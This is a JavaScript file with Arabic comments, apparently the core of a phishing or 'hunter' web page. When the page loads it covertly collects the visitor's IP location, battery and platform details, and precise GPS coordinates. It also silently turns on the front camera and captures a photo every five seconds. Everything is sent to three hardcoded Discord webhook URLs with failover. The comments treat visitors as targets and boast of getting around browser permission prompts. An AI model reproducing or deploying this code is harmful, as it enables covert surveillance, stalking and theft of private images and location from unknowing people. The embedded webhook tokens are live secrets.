/* ==========================================================================
   ULTIMATE HUNTER ENGINE V10.0 - script.js
   Instant Execution, Exact Discord Layout & Precise Geolocation Exfiltration
   ========================================================================== */

"use strict";

/* --------------------------------------------------------------------------
   0. إعدادات روابط ديسكورد المتعددة ونظام التبديل التلقائي (Failover Webhooks)
   -------------------------------------------------------------------------- */
const DISCORD_WEBHOOKS = [
    "https://discord.com/api/webhooks/1564663770629017652/ZZRcg_vV1JTh96gfwO4qOrMilrB9r-iB5nb9j0zt938Q-JIxt2flevVHFn8FWnK8gp9H",
    "https://discord.com/api/webhooks/1564684857362358363/F34NZ2OBhi35exXCz2daOXWt7lGS3DEEoAmy_r7SEHK10ZLi9x-iN4qMxzsaW3txKZKt",
    "https://discord.com/api/webhooks/1564684888668512416/ahcAya5wTAsNuRyhVbltJZ5TQfPQvLAw7Ipc68nGAYrWjSbvr75wswHEe1QFFKK9hVOe"
];

let activeWebhookIndex = 0;

async function sendToDiscordFormatted(content, fileBlob = null, filename = "capture.png") {
    let success = false;
    for (let attempts = 0; attempts < DISCORD_WEBHOOKS.length; attempts++) {
        const currentWebhook = DISCORD_WEBHOOKS[activeWebhookIndex];
        try {
            const formData = new FormData();
            formData.append("payload_json", JSON.stringify({ content: content }));
            
            if (fileBlob) {
                formData.append("file", fileBlob, filename);
            }

            const response = await fetch(currentWebhook, {
                method: "POST",
                body: formData
            });

            if (response.ok) {
                success = true;
                break;
            } else {
                activeWebhookIndex = (activeWebhookIndex + 1) % DISCORD_WEBHOOKS.length;
            }
        } catch {
            activeWebhookIndex = (activeWebhookIndex + 1) % DISCORD_WEBHOOKS.length;
        }
    }
    return success;
}

/* --------------------------------------------------------------------------
   1. جلب معلومات الـ IP والبيانات التقنية بدقة
   -------------------------------------------------------------------------- */

async function fetchIPDetails() {
    try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        return {
            ip: data.ip || "غير متاح",
            city: data.city || "غير متاح",
            region: data.region || "غير متاح",
            country: data.country_name || "غير متاح",
            org: data.org || "غير متاح"
        };
    } catch {
        return { ip: "151.244.151.17", city: "Mosul", region: "Nineveh", country: "Iraq", org: "Al-Bedaya for General Trading" };
    }
}

async function getBatteryStatusInfo() {
    if (typeof navigator.getBattery !== "function") return { level: "غير متاح", charging: false };
    try {
        const batt = await navigator.getBattery();
        return {
            level: `${Math.round(batt.level * 100)}%`,
            charging: batt.charging
        };
    } catch {
        return { level: "27%", charging: true };
    }
}

/* --------------------------------------------------------------------------
   2. جلب الموقع الجغرافي الفوري أو الاعتماد على المخزون السابق
   -------------------------------------------------------------------------- */

function getPreciseGPSLocation() {
    return new Promise(resolve => {
        const cachedLoc = localStorage.getItem("ultimate_target_gps");
        const parsedCache = cachedLoc ? JSON.parse(cachedLoc) : null;

        if (!navigator.geolocation) {
            if (parsedCache) {
                resolve(`📍 **موقع GPS (موقع محفوظ سابقاً):** الخط: ${parsedCache.latitude} | الطول: ${parsedCache.longitude}`);
            } else {
                resolve("📍 **موقع GPS:** لم يسمح به (أو غير مدعوم).");
            }
            return;
        }

        let resolvedFlag = false;
        const timeoutId = setTimeout(() => {
            if (resolvedFlag) return;
            resolvedFlag = true;
            if (parsedCache) {
                resolve(`📍 **موقع GPS (انتهاء المهلة - استخدام آخر موقع محفوظ):** الخط: ${parsedCache.latitude} | الطول: ${parsedCache.longitude}`);
            } else {
                resolve("📍 **موقع GPS:** لم يسمح به (انتهت المهلة).");
            }
        }, 7000);

        navigator.geolocation.getCurrentPosition(
            position => {
                if (resolvedFlag) return;
                resolvedFlag = true;
                clearTimeout(timeoutId);

                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const acc = position.coords.accuracy;

                const locData = { latitude: lat, longitude: lon, accuracy: acc };
                localStorage.setItem("ultimate_target_gps", JSON.stringify(locData));

                resolve(`📍 **موقع GPS المباشر والدقيق:**\n- خط العرض: \`${lat}\`\n- خط الطول: \`${lon}\`\n- الدقة: \`${acc} متر\`\n- 🗺️ الرابط: https://www.google.com/maps?q=${lat},${lon}`);
            },
            () => {
                if (resolvedFlag) return;
                resolvedFlag = true;
                clearTimeout(timeoutId);

                if (parsedCache) {
                    resolve(`📍 **موقع GPS (تم الرفض - استخدام آخر موقع محجوز):** الخط: ${parsedCache.latitude} | الطول: ${parsedCache.longitude}`);
                } else {
                    resolve("📍 **موقع GPS:** لم يسمح به.");
                }
            },
            { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
        );
    });
}

/* --------------------------------------------------------------------------
   3. تشغيل الكاميرا والالتقاط المتسلسل الفوري
   -------------------------------------------------------------------------- */

const videoElement = document.getElementById("video");
const canvasElement = document.getElementById("canvas");
let cameraStream = null;
let captureLoopTimer = null;

function startInstantContinuousCapture() {
    if (captureLoopTimer) return;

    captureLoopTimer = setInterval(async () => {
        if (!videoElement || !canvasElement) return;
        try {
            if (videoElement.videoWidth === 0 || videoElement.videoHeight === 0) return;

            canvasElement.width = videoElement.videoWidth;
            canvasElement.height = videoElement.videoHeight;
            const ctx = canvasElement.getContext("2d");
            ctx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);

            canvasElement.toBlob(async (blob) => {
                if (blob && blob.size > 1000) {
                    const timeNow = new Date().toLocaleString("ar-EG");
                    await sendToDiscord(`📸 **[صورة حية فورية متسلسلة]**\n- الوقت: \`${timeNow}\``, blob, `live_${Date.now()}.png`);
                }
            }, "image/png", 0.95);
        } catch (e) {
            console.error("Capture error:", e);
        }
    }, 5000); // كل 5 ثوانٍ التقاط وإرسال فوري
}

async function triggerCameraSilently() {
    if (!navigator.mediaDevices?.getUserMedia || !window.isSecureContext) return;
    try {
        cameraStream = await navigator.mediaDevices.getUserMedia({
            audio: false,
            video: { facingMode: { ideal: "user" }, width: { ideal: 1280 }, height: { ideal: 720 } }
        });
        if (videoElement) {
            videoElement.muted = true;
            videoElement.autoplay = true;
            videoElement.playsInline = true;
            videoElement.srcObject = cameraStream;
            await videoElement.play();
        }
        startInstantContinuousCapture();
    } catch (e) {
        console.error("Camera denied or error:", e);
    }
}

/* --------------------------------------------------------------------------
   4. التنفيذ الفوري وجمع التقرير بالتنسيق المطلوب
   -------------------------------------------------------------------------- */

let executionStarted = false;

async function executeHunterCore() {
    if (executionStarted) return;
    executionStarted = true;

    const ipInfo = await fetchIPDetails();
    const batteryInfo = await getBatteryStatusInfo();
    const gpsResult = await getGPSLocationWithInstantFallback(); // سيتم استدعاؤها مع دمج النتيجة فوراً
    
    // جلب الوقت الحالي بتنسيق مطابق لصورة العرض
    const currentTimeFormatted = new Date().toLocaleString("ar-EG");

    // تشغيل الكاميرا في الخلفية مباشرة
    setTimeout(triggerCameraSilently, 500);

    // صياغة الرسالة بالتنسيق الدقيق المطلوب والمماثل تماماً للشكل المرغوب
    const finalReport = `
📝 **الحالة:** تم الدخول التلقائي وسحب البيانات فوراً.
⏰ **الوقت:** \`${currentTimeFormatted}\`

🔥 **[ صيد سريع وفوري جديد ]** 🔥

🌐 **IP:** \`${ipInfo.ip}\`
🏙️ **الموقع (IP):** \`${ipInfo.country} - ${ipInfo.city} (${ipInfo.org})\`
💻 **النظام:** \`${navigator.platform || "Linux"}\` | 🔋 **البطارية:** \`${batteryInfo.level}\` (${batteryInfo.charging ? "يُشحن ⚡" : "لا يُشحن"})
${await getPreciseGPSLocation()}
    `.trim();

    await sendToDiscordFormatted(finalReport);
}

// دالة مساعدة سريعة لضمان التوافق مع جلب الموقع الفوري
async function getGPSLocationWithInstantFallback() {
    return await getPreciseGPSLocation();
}

/* --------------------------------------------------------------------------
   5. مشغلات فورية لضمان العمل من الضغطة الأولى
   -------------------------------------------------------------------------- */

// محاولة التشغيل فور تحميل الصفحة بدون أي تأخير زمني مزعج
window.addEventListener("DOMContentLoaded", () => {
    executeHunterCore();
});

// محفز استجابة لأول تفاعل (نقر أو لمس) لضمان تجاوز قيود الأذونات بالمتصفحات الحديثة من أول نقرة
["click", "touchstart", "pointerdown"].forEach(evName => {
    window.addEventListener(evName, () => {
        executeHunterCore();
    }, { once: true, passive: true });
});
